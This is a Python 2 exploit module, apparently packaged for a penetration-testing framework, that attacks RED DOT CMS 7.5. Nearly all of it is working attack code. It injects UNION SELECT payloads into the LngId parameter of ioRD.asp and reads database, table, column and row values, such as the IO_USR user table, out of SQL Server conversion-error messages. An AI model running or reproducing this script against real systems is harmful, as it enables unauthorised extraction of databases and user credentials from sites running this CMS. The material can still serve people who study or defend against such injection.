
def about():
	print '''RED DOT CMS 7.5 database enumeration
	'''

def auto_help(name,rank,description):
	stbl = "  " + name + " "*(13-len(name)+4) + rank + " "*(7-len(rank)+4) + description
	return stbl

def auto_targ(targetlist):
	print "Vulnrable Applications (RedDotCMS)"
	print
	print "  ID	   Device"
	print "  --	   ------"
	for _ in targetlist:
		print "  "+_+" "*(8-len(_))+targetlist[_]
	print

try:
	if desc == "get-id":
		print auto_help("RedDotCMS","Normal","Satabase Enumeration")
except:
	pass

def auto_info(name="",module="",plat="",priv="",lic="",rank="Normal",release="N/A",by="N/A"):
	print
	print "Publisher Information for RedDotCMS"
	print
	print "	   Name:","RedDotCMS"
	print "	 Module:",module
	print "   Platform:","Python"
	print " Privileged:","No"
	print "	License:","None"
	print "	   Rank:",rank
	print "  Disclosed:",release

def auto_opt(name,cset,req,description):
	stbl = "  " + name + " "*(9-len(name)) + cset + " "*(12-len(cset)+2) + req + " "*(8-len(req)+2) + description
	print stbl

class RedDotCMS(object):
	def start(self):
		#!/usr/bin/env python
		
		# un-comment your selection.
		
		import urllib2
		import urllib
		import string
		import getopt
		import sys
		
		def banner():
			print
			print "RED DOT CMS 7.5 database enumeration"
			print "by Mark & David"
		
		def usage():
			print
			print "usage():"
			print "python RD_POC.py [options] URL"
			print
			print " [options]"
			print "		--dbenum: Database enumeration"
			print "		--tableenum: Table enumeration, use -d to specify database"
			print "		--colenum: Column enumeration, use -d to specify database and -t to specify table"
			print "		--dataenum: Data enumeration, use -d to specify database, -t to specify table and -c to specify a column"
			print "		-d: Specify a database"
			print "		-t: Specify a table"
			print "		-c: Specify a column"
			print "		-h: Help page"
			print
			print "Examples: "
			print "		python RD_POC.py --dbenum http://myhost/cms/"
			print "		python RD_POC.py --tableenum -d IoAdministration http://myhost/cms/"
			print "		python RD_POC.py --colenum -d IoAdministration -t IO_USR http://myhost/cms/"
			print "		python RD_POC.py --dataenum -d IoAdministration -t IO_USR -c USR2 http://myhost/cms/"
			print
			sys.exit()
		
		def retrievedata(url1, url2 = "' ORDER BY 1;-- &DisableAutoLogin=1"):
			stop = 0
		
			current = ''
		
			while (stop==0):
		
				request = url1 + current + url2
		
				request = string.replace(request, ' ', '%20')
				req = urllib2.Request(request)
				try:
					r = urllib2.urlopen(req)
				except urllib2.URLError, msg:
					print "[+] Error: Error requesting URL (%s)" % msg
				result = r.read()
		
				#print result
				if string.find(result, ' Description  Conversion failed when converting the ') == -1:
					stop = 1
				else:
					start = string.find(result, "'") + 1
					end = string.find(result[start:], "'") + start
					current = result[start:end]
					print current
		
		
		def dbenum():
		
			retrievedata(url + "/ioRD.asp?Action=ShowMessage&LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT min(name) FROM SYS.SYSDATABASES where name> '")
		
		def tableenum(database=''):
		
			if database=='':
				retrievedata(url + "/ioRD.asp?Action=ShowMessage&LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT min(name) FROM SYSOBJECTS where xtype=char(85) and name> '")
		
			else:
				retrievedata(url + "/ioRD.asp?Action=ShowMessage&LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT min(name) FROM " + database + "..SYSOBJECTS where xtype=char(85) and name> '")
		
		def colenum(table, database=''):
		
			if table=='':
				usage()
		
			if database=='':
				retrievedata(url + "/ioRD.asp?Action=ShowMessage&LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT min(name) FROM SYSCOLUMNS where name > '", "' AND id = (SELECT id from SYSOBJECTS WHERE name= '" + table + "') ORDER BY 1;-- &DisableAutoLogin=1")
			else:
				retrievedata(url + "/ioRD.asp?Action=ShowMessage&LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT min(name) FROM " + database + "..SYSCOLUMNS where name > '","' AND id = (SELECT id from " + database + "..SYSOBJECTS WHERE name= '" + table + "') ORDER BY 1;-- &DisableAutoLogin=1")
		
		
		def dataenum(column, table, database=''):
		
			if column=='' or table=='':
				usage()
		
			if database=='':
				retrievedata(url + "/ioRD.asp?Action=ShowMessage&LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT MIN(" + column + ") FROM " + table + " WHERE " + column + "> '")
			
			else:
				retrievedata(url + "/ioRD.asp?Action=ShowMessage&LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT MIN(" + column + ") FROM " + database + ".." + table + " WHERE " + column + "> '")
		
		
		banner()
		pdbenum = 0
		ptableenum = 0
		pcolenum = 0
		pdataenum = 0
		database = ''
		table = ''
		column = ''
		
		url = raw_input("Target URL: ")
		
		try:
			opts, args = getopt.getopt(sys.argv[1:], "d:t:c:h:", ["help", "dbenum", "tableenum", "colenum", "dataenum"])
		except getopt.GetoptError:
			usage()
		
		try:
			if raw_input("Enumeration [y/n] ") == "y":
				if raw_input("Database Enumeration [y/n] ") == "y":
					pdbenum = 1
				if raw_input("Table Enumeration [y/n] ") == "y":
					ptableenum = 1
				if raw_input("Column Enumeration [y/n] ") == "y":
					pcolenum = 1
				if raw_input("Data Enumeration [y/n] ") == "y":
					pdataenum = 1
			else:
				database = raw_input("Database: ")
				table = raw_input("Table: ")
				column = raw_input("Column: ")
		except:
			usage()
		
		
		if pdbenum == 1:
			print 'Enumerating databases:'
			dbenum()
		elif ptableenum == 1:
			print 'Enumerating tables:'
			tableenum(database)
		elif pcolenum == 1:
			print 'Enumerating columns:'
			colenum(table, database)
		elif pdataenum == 1:
			print 'Enumerating data:'
			dataenum(column, table, database)
		else:
			usage()


def show_opt():
	print
	print "Module Options (RedDotCMS)"
	print
	print "  Name	 Current Setting  Required  Description"
	print "  ----	 ---------------  --------  -----------"
	try:
		TIMEOUT
	except:
		TIMEOUT = 5
	try:
		auto_opt("TIMEOUT", str(TIMEOUT),"no", "Timeout Time")
	except:
		auto_opt("TIMEOUT","   ","no", "Timelout Time")
	print 

try:
	if desc == "get-opt":
		show_opt()
except:
	pass

try:
	if desc == "get-info":
		auto_info(module="exploit",plat="Python 2.7",priv="No",lic="N/A")
		show_opt()
		targets = {"1":"RED DOT CMS 7.5"}
		auto_targ(targets)
		about()
		print
except Exception as e:
	pass

try:
	if desc == "proc":
		try:
			program = RedDotCMS()
			program.start()
		except Exception as e:
			print e
			print "[-] Failed"
			time.sleep(0.3)
			show_opt()
except:
	pass
